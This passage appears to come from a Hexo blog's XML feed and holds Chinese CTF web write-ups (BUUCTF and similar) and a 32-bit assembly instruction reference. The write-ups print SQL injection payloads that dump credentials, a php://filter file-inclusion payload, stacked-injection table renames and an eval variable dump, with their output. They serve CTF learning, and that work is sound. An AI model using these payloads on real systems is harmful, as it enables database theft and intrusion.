language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)%23&amp;password=2Hello 2！Your password is '</span>cl4y<span class="token operator">~</span>wo_tai_nan_le<span class="token punctuation">,</span>glzjin<span class="token operator">~</span>glzjin_wants_a_girlfriend<span class="token punctuation">,</span>Z4cHAr7zCr<span class="token operator">~</span>biao_ge_dddd_hm<span class="token punctuation">,</span>0xC4m3l<span class="token operator">~</span>linux_chuang_shi_ren<span class="token punctuation">,</span>Ayrain<span class="token operator">~</span>a_rua_rain<span class="token punctuation">,</span>Akko<span class="token operator">~</span>yan_shi_fu_de_mao_bo_he<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>cl4y<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_2_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_3_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_4_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_5_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_6_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_7_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_8_kuai_fu_ji<span class="token punctuation">,</span>leixiao<span class="token operator">~</span>Syc_san_da_hacker<span class="token punctuation">,</span>flag<span class="token operator">~</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> 'cl4y<span class="token operator">~</span>wo_tai_nan_le<span class="token punctuation">,</span>glzjin<span class="token operator">~</span>glzjin_wants_a_girlfriend<span class="token punctuation">,</span>Z4cHAr7zCr<span class="token operator">~</span>biao_ge_dddd_hm<span class="token punctuation">,</span>0xC4m3l<span class="token operator">~</span>linux_chuang_shi_ren<span class="token punctuation">,</span>Ayrain<span class="token operator">~</span>a_rua_rain<span class="token punctuation">,</span>Akko<span class="token operator">~</span>yan_shi_fu_de_mao_bo_he<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>cl4y<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_2_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_3_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_4_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_5_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_6_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_7_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_8_kuai_fu_ji<span class="token punctuation">,</span>leixiao<span class="token operator">~</span>Syc_san_da_hacker<span class="token punctuation">,</span>flag<span class="token operator">~</span>flag<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;b68743d7-102c-415c-82f9-447bff55b3f6&amp;#125;''</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Secret File</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看源码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>master<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./Archive_room.php<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#000000</span><span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span><span class="token number">70</span>px<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span><span class="token number">44%</span><span class="token punctuation">;</span><span class="token property">cursor</span><span class="token punctuation">:</span>default<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Oh! You found me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>点击跳转到<code>./Archive_room.php</code></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyNLt.png" alt="6EyNLt.png"></p><p>点击secret，跳转</p><p><img src="https://s3.ax1x.com/2021/03/03/6Eywo8.png" alt="6Eywo8.png"></p><p>回到刚才页面，抓包看看</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">302 Found</span></span><span class="token header-name keyword">Server:</span> openresty<span class="token header-name keyword">Date:</span> Wed, 24 Feb 2021 08:46:54 GMT<span class="token header-name keyword">Content-Type:</span> text/html; charset=UTF-8<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Location:</span> end.php<span class="token header-name keyword">X-Powered-By:</span> PHP/7.3.11<span class="token header-name keyword">Content-Length:</span> 63<span class="token text/html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--   secr3t.php        --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>看到重定向了</p><p>进入<code>secr3t.php </code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag放在了flag.php里</span><span class="token delimiter">?></span></code></pre><p>过滤了<code>../</code> <code>tp</code> <code>input</code> <code>data</code></p><pre class=" language-php"><code class="language-php">payloadsecr3t<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php</span></code></pre><p>解码得到</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>                <span class="token keyword">echo</span> <span class="token string">"我就在这里"</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag&amp;#123;c09a95d6-8ff9-4c3f-be29-20c8f10d75de&amp;#125;'</span><span class="token punctuation">;</span>                <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>            <span class="token delimiter">?></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯_2019 随便注</title>
      <link href="2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/"/>
      <url>2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入’报错</p><p><img src="https://s3.ax1x.com/2021/03/03/6Es8uq.gif" alt="6Es8uq.gif"></p><p>用order by 查出有两个字段</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsrK1.gif" alt="6EsrK1.gif"><img src="https://s3.ax1x.com/2021/03/03/6EsgUO.gif" alt="6EsgUO.gif"></p><p>这里发现select被过滤，我绕不过</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsWPe.gif" alt="6EsWPe.gif"></p><p>试了一下能进行堆叠注入</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsIKI.gif" alt="6EsIKI.gif"></p><p>查到两个表 1919810931114514、words</p><p>查询表中列</p><p>?inject=’;show columns from <code>1919810931114514</code> %23</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsTqP.jpg" alt="6EsTqP.jpg"></p><p>?inject=’;show columns from <code>words</code> %23</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsHVf.jpg" alt="6EsHVf.jpg"></p><p>禁用了select，可以采用预编译来爆数据</p><p>这里存在大小写绕过</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsOPg.gif" alt="6EsOPg.gif"></p><p><img src="https://s3.ax1x.com/2021/03/03/6Esj2j.gif" alt="6Esj2j.gif"></p><p>alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>这种是猜测默认查words中的数据</p><p>此payload是将words改为words1，将1919810931114514改为words，将其中数据列也改为id varchar（50）</p><p>再通过’ or 1=1查全部数据</p><p><img src="https://s3.ax1x.com/2021/03/03/6EySrq.gif" alt="6EySrq.gif"></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyPaT.gif" alt="6EyPaT.gif"></p><p>表名为数字时，要用反引号包起来查询</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Training_WWW_Robots</title>
      <link href="2021/02/01/training-www-robots/"/>
      <url>2021/02/01/training-www-robots/</url>
      
        <content type="html"><![CDATA[<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>进去就有提示</p><p>robots.txt文件是为了告诉爬虫程序或者搜索引擎哪些资源不能爬，你就可以从这些资源中找到你要用的,然后进行你的操作</p><p><img src="https://s3.ax1x.com/2021/03/03/6ErLcR.png" alt="6ErLcR.png"></p><p><img src="https://s3.ax1x.com/2021/03/03/6ErvB6.png" alt="6ErvB6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baby_web</title>
      <link href="2021/02/01/baby-web/"/>
      <url>2021/02/01/baby-web/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p>根据提示 初始页面 可以想到index（大部分正常网站都是index）尝试将url改为index.php，发现跳转到了1.php，说明被重定向了</p><p>第一种方法，浏览器中F12打开面板，在网络模块可以发现flag</p><p><img src="https://s3.ax1x.com/2021/03/03/6ED3Gj.png" alt="6ED3Gj.png"></p><p>第二种直接用bp抓包，查看响应头flag</p><p><img src="https://s3.ax1x.com/2021/03/03/6EDNLV.png" alt="6EDNLV.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破-1</title>
      <link href="2021/02/01/bao-po-1/"/>
      <url>2021/02/01/bao-po-1/</url>
      
        <content type="html"><![CDATA[<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><p>进去后如下代码提示</p><pre class=" language-php+HTML"><code class="language-php+HTML"><?phpinclude "flag.php";$a = @$_REQUEST['hello'];if(!preg_match('/^\w*$/',$a ))&#123;  die('ERROR');&#125;eval("var_dump($$a);");show_source(__FILE__);?></code></pre><p>$_REQUEST[‘hello’]</p><p>提交的参数是hello，前面提示在某个6位变量中，想到爆破，但是工作量很大</p><p>/^\w*$/ </p><p>^n   以n开头</p><p>n$  以n结尾</p><p>n*  匹配0个或者多个n</p><p>\w  查找单词字符  A_Z  a_z  0_9  _</p><p>正则过滤后爆破还是很大的工作量</p><p>eval(“var_dump($$a);”)</p><p>eavl()是代码执行函数，</p><p>var_dump() 函数将变量的类型、值、结构等信息打印出来</p><p>这里就可以是用全局变量$GLOBALS将所有变量打印出来</p><p><img src="https://s3.ax1x.com/2021/03/03/6EyMdK.png" alt="6EyMdK.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位汇编指令总结(代码示例)</title>
      <link href="2021/01/03/zhi-ling/"/>
      <url>2021/01/03/zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h1><h3 id="MOV-传送字或字节"><a href="#MOV-传送字或字节" class="headerlink" title="MOV 传送字或字节"></a>MOV 传送字或字节</h3><pre class=" language-c++"><code class="language-c++">mov al,10h</code></pre><h3 id="MOVSX-先符号扩展-再传送"><a href="#MOVSX-先符号扩展-再传送" class="headerlink" title="MOVSX 先符号扩展,再传送"></a>MOVSX 先符号扩展,再传送</h3><pre class=" language-c++"><code class="language-c++">movsx eax,ax;先进行全零扩展,前16位为F</code></pre><h3 id="MOVZX-先零扩展-再传送"><a href="#MOVZX-先零扩展-再传送" class="headerlink" title="MOVZX 先零扩展,再传送"></a>MOVZX 先零扩展,再传送</h3><pre class=" language-c++"><code class="language-c++">movzx eax,ax;先进行全零扩展,前16位为0</code></pre><h3 id="PUSH-把字压入堆栈"><a href="#PUSH-把字压入堆栈" class="headerlink" title="PUSH 把字压入堆栈"></a>PUSH 把字压入堆栈</h3><pre class=" language-c++"><code class="language-c++">push reg/nem16   32push imm32</code></pre><h3 id="POP-把字弹出堆栈"><a href="#POP-把字弹出堆栈" class="headerlink" title="POP 把字弹出堆栈"></a>POP 把字弹出堆栈</h3><pre class=" language-c++"><code class="language-c++">pop reg/nem16  32</code></pre><h3 id="PUSHFD-把32EFLAGS寄存器内容压入堆栈"><a href="#PUSHFD-把32EFLAGS寄存器内容压入堆栈" class="headerlink" title="PUSHFD 把32EFLAGS寄存器内容压入堆栈"></a>PUSHFD 把32EFLAGS寄存器内容压入堆栈</h3><pre class=" language-c++"><code class="language-c++">pushfd;保存标志寄存器内容</code></pre><h3 id="POPFD-把32EFLAGS寄存器内容弹出堆栈"><a href="#POPFD-把32EFLAGS寄存器内容弹出堆栈" class="headerlink" title="POPFD 把32EFLAGS寄存器内容弹出堆栈"></a>POPFD 把32EFLAGS寄存器内容弹出堆栈</h3><pre class=" language-c++"><code class="language-c++">popfd;恢复标志寄存器内容</code></pre><h3 id="PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈"><a href="#PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈" class="headerlink" title="PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈"></a>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈</h3><pre class=" language-c++"><code class="language-c++">pusha;保存16通用寄存器内容</code></pre><h3 id="POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈"><a href="#POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈" class="headerlink" title="POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈"></a>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈</h3><pre class=" language-c++"><code class="language-c++">popa;恢复16通用寄存器内存</code></pre><h3 id="PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈"><a href="#PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈" class="headerlink" title="PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈"></a>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈</h3><pre class=" language-c++"><code class="language-c++">pushad;保存32通用寄存器内容</code></pre><h3 id="POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈"><a href="#POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈" class="headerlink" title="POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈"></a>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈</h3><pre class=" language-c++"><code class="language-c++">popad;恢复32通用寄存器内存</code></pre><h3 id="BSWAP-交换32位寄存器里字节的顺序"><a href="#BSWAP-交换32位寄存器里字节的顺序" class="headerlink" title="BSWAP 交换32位寄存器里字节的顺序"></a>BSWAP 交换32位寄存器里字节的顺序</h3><pre class=" language-c++"><code class="language-c++">;EAX=96688368HBSWAP EAX;EAX=68836896H</code></pre><h3 id="XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数"><a href="#XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数" class="headerlink" title="XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)"></a>XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</h3><pre class=" language-c++"><code class="language-c++">xchg ax,hxxchg ah,alxchg eax,ebxxchg var,ax;var16位</code></pre><h3 id="CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX"><a href="#CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX" class="headerlink" title="CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )"></a>CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )</h3><pre class=" language-c++"><code class="language-c++">CMPXCHG CX,DX;如果指令执行前 (AX)=2300H,(CX)=2300H.(DX)=2400H;则指令执行后 因（CX）=(AX),故(CX)=2400H,ZF=1;如果指令执行前（AX）=2500H,(CX)=2300H,(DX)=2400H;则指令执行后因（CX）!=(AX)，故(AX)=2300H，ZF=0</code></pre><h3 id="XADD-先交换再累加-结果在第一个操作数里"><a href="#XADD-先交换再累加-结果在第一个操作数里" class="headerlink" title="XADD 先交换再累加( 结果在第一个操作数里 )"></a>XADD 先交换再累加( 结果在第一个操作数里 )</h3><pre class=" language-c++"><code class="language-c++">xadd eax，ecx;相当于：    先执行：        xchg eax,ecx    然后执行：        add eax,ecx</code></pre><h3 id="XLAT-字节查表转换"><a href="#XLAT-字节查表转换" class="headerlink" title="XLAT 字节查表转换"></a>XLAT 字节查表转换</h3><pre class=" language-c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat</code></pre><p>BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 0-FFH); 返回 AL 为查表结果 ( [BX+AL]-&gt;AL )</p><h1 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h1><h3 id="IN-I-O端口输入"><a href="#IN-I-O端口输入" class="headerlink" title="IN I/O端口输入"></a>IN I/O端口输入</h3><pre class=" language-c++"><code class="language-c++">语法: IN 累加器, &#123;端口号│DX&#125;</code></pre><h3 id="OUT-I-O端口输出"><a href="#OUT-I-O端口输出" class="headerlink" title="OUT I/O端口输出"></a>OUT I/O端口输出</h3><pre class=" language-c++"><code class="language-c++">语法: OUT &#123;端口号│DX&#125;,累加器</code></pre><h3 id="输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535"><a href="#输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535" class="headerlink" title="输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535"></a>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535</h3><h1 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h1><h3 id="LEA-装入有效地址"><a href="#LEA-装入有效地址" class="headerlink" title="LEA 装入有效地址"></a>LEA 装入有效地址</h3><pre class=" language-c++"><code class="language-c++">LEA DX,string ;把偏移地址存到DX</code></pre><h3 id="LDS-传送目标指针-把指针内容装入DS"><a href="#LDS-传送目标指针-把指针内容装入DS" class="headerlink" title="LDS 传送目标指针,把指针内容装入DS"></a>LDS 传送目标指针,把指针内容装入DS</h3><pre class=" language-c++"><code class="language-c++">LDS SI,string ;把段地址:偏移地址存到DS:SI</code></pre><h3 id="LES-传送目标指针-把指针内容装入ES"><a href="#LES-传送目标指针-把指针内容装入ES" class="headerlink" title="LES 传送目标指针,把指针内容装入ES"></a>LES 传送目标指针,把指针内容装入ES</h3><pre class=" language-c++"><code class="language-c++">LES DI,string ;把段地址:偏移地址存到ESDI</code></pre><h3 id="LFS-传送目标指针-把指针内容装入FS"><a href="#LFS-传送目标指针-把指针内容装入FS" class="headerlink" title="LFS 传送目标指针,把指针内容装入FS"></a>LFS 传送目标指针,把指针内容装入FS</h3><pre class=" language-c++"><code class="language-c++">LFS DI,string ;把段地址:偏移地址存到FSD</code></pre><h3 id="LGS-传送目标指针-把指针内容装入GS"><a href="#LGS-传送目标指针-把指针内容装入GS" class="headerlink" title="LGS 传送目标指针,把指针内容装入GS"></a>LGS 传送目标指针,把指针内容装入GS</h3><pre class=" language-c++"><code class="language-c++">LGS DI,string ;把段地址:偏移地址存到GSDI </code></pre><h3 id="LSS-传送目标指针-把指针内容装入SS"><a href="#LSS-传送目标指针-把指针内容装入SS" class="headerlink" title="LSS 传送目标指针,把指针内容装入SS"></a>LSS 传送目标指针,把指针内容装入SS</h3><pre class=" language-c++"><code class="language-c++">LSS DI,string ;把段地址:偏移地址存到SSDI</code></pre><h1 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h1><h3 id="LAHF-标志寄存器传送-把标志装入AH"><a href="#LAHF-标志寄存器传送-把标志装入AH" class="headerlink" title="LAHF 标志寄存器传送,把标志装入AH"></a>LAHF 标志寄存器传送,把标志装入AH</h3><pre class=" language-c++"><code class="language-c++">.data    saveflags byte ?.code    lahf    mov saveflags,ah</code></pre><h3 id="SAHF-标志寄存器传送-把AH内容装入标志寄存器"><a href="#SAHF-标志寄存器传送-把AH内容装入标志寄存器" class="headerlink" title="SAHF 标志寄存器传送,把AH内容装入标志寄存器"></a>SAHF 标志寄存器传送,把AH内容装入标志寄存器</h3><pre class=" language-c++"><code class="language-c++">mov ah,saveflags    sahf</code></pre><h3 id="PUSHF-标志入栈"><a href="#PUSHF-标志入栈" class="headerlink" title="PUSHF 标志入栈"></a>PUSHF 标志入栈</h3><pre class=" language-c++"><code class="language-c++">pushf;保存标志寄存器内容</code></pre><h3 id="POPF-标志出栈"><a href="#POPF-标志出栈" class="headerlink" title="POPF 标志出栈"></a>POPF 标志出栈</h3><pre class=" language-c++"><code class="language-c++">popf;恢复标志寄存器内容</code></pre><h3 id="PUSHD-32位标志入栈"><a href="#PUSHD-32位标志入栈" class="headerlink" title="PUSHD 32位标志入栈"></a>PUSHD 32位标志入栈</h3><pre class=" language-c++"><code class="language-c++">pushd;保存32通用寄存器内容</code></pre><h3 id="POPD-32位标志出栈"><a href="#POPD-32位标志出栈" class="headerlink" title="POPD 32位标志出栈"></a>POPD 32位标志出栈</h3><pre class=" language-c++"><code class="language-c++">popd;恢复32通用寄存器内存</code></pre><h1 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h1><h3 id="ADD-加法"><a href="#ADD-加法" class="headerlink" title="ADD 加法"></a>ADD 加法</h3><pre class=" language-c++"><code class="language-c++">mov eax,1add eax,12</code></pre><h3 id="ADC-带进位加法"><a href="#ADC-带进位加法" class="headerlink" title="ADC 带进位加法"></a>ADC 带进位加法</h3><pre class=" language-c++"><code class="language-c++">mov dl,0mov al,0FFhadd al,0FFh;AL=FEhadc dl,0;DL/AL=01FEh</code></pre><h3 id="INC-加-1"><a href="#INC-加-1" class="headerlink" title="INC 加 1"></a>INC 加 1</h3><pre class=" language-c++"><code class="language-c++">mov ax,1inc ax</code></pre><h3 id="AAA-加法的ASCII码调整"><a href="#AAA-加法的ASCII码调整" class="headerlink" title="AAA 加法的ASCII码调整"></a>AAA 加法的ASCII码调整</h3><pre class=" language-c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hadd al,'2';AX=006Ahaaa;AX=0100h(结果进行ASCII转换)or ax,3030h;AX=3130h='10'(转换为ASCII码)</code></pre><h3 id="DAA-加法的十进制调整"><a href="#DAA-加法的十进制调整" class="headerlink" title="DAA 加法的十进制调整"></a>DAA 加法的十进制调整</h3><pre class=" language-c++"><code class="language-c++">mov al,35hadd al,48h;AL=7Dhdaa;AL=83h(调整后结果)</code></pre><h3 id="SUB-减法"><a href="#SUB-减法" class="headerlink" title="SUB 减法"></a>SUB 减法</h3><pre class=" language-c++"><code class="language-c++">mov al,23sub al,3</code></pre><h3 id="SBB-带借位减法"><a href="#SBB-带借位减法" class="headerlink" title="SBB 带借位减法"></a>SBB 带借位减法</h3><pre class=" language-c++"><code class="language-c++">mov edx,7;高32位mov eax,1;低32位sub eax，2sbb edx，0;高32位减法</code></pre><h3 id="DEC-减-1"><a href="#DEC-减-1" class="headerlink" title="DEC 减 1"></a>DEC 减 1</h3><pre class=" language-c++"><code class="language-c++">dec al</code></pre><h3 id="NEC-求反-以-0-减之"><a href="#NEC-求反-以-0-减之" class="headerlink" title="NEC 求反(以 0 减之)"></a>NEC 求反(以 0 减之)</h3><pre class=" language-c++"><code class="language-c++">nec al</code></pre><h3 id="CMP-比较-两操作数作减法-仅修改标志位-不回送结果"><a href="#CMP-比较-两操作数作减法-仅修改标志位-不回送结果" class="headerlink" title="CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)"></a>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)</h3><pre class=" language-c++"><code class="language-c++">mov ax,5cmp ax,10;ZF=0 and CF=1</code></pre><h3 id="AAS-减法的ASCII码调整"><a href="#AAS-减法的ASCII码调整" class="headerlink" title="AAS 减法的ASCII码调整"></a>AAS 减法的ASCII码调整</h3><pre class=" language-c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hsub al,'9';AX=00FFhaas;AX=FF09hpushfor al,30h;AX=FF39hpopf</code></pre><h3 id="DAS-减法的十进制调整"><a href="#DAS-减法的十进制调整" class="headerlink" title="DAS 减法的十进制调整"></a>DAS 减法的十进制调整</h3><pre class=" language-c++"><code class="language-c++">mov bl,48hmov al,85hsub al,bl;AL=3Dhdas;AL=37h(调整后结果)</code></pre><h3 id="MUL-无符号乘法"><a href="#MUL-无符号乘法" class="headerlink" title="MUL 无符号乘法"></a>MUL 无符号乘法</h3><pre class=" language-c++"><code class="language-c++">var word 0100hmov ax,2000h;AX=2000h;AX存储结果mul 0100h/var;DX:AX=00200000h,CF=1;32位EDX:EAX</code></pre><h3 id="IMUL-整数乘法"><a href="#IMUL-整数乘法" class="headerlink" title="IMUL 整数乘法"></a>IMUL 整数乘法</h3><pre class=" language-c++"><code class="language-c++">mov ax,48mov bx,4imul bx;DX:AX=000000C0h,OF=0</code></pre><h3 id="以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算"><a href="#以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算" class="headerlink" title="以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)"></a>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)</h3><h3 id="AAM-乘法的ASCII码调整"><a href="#AAM-乘法的ASCII码调整" class="headerlink" title="AAM 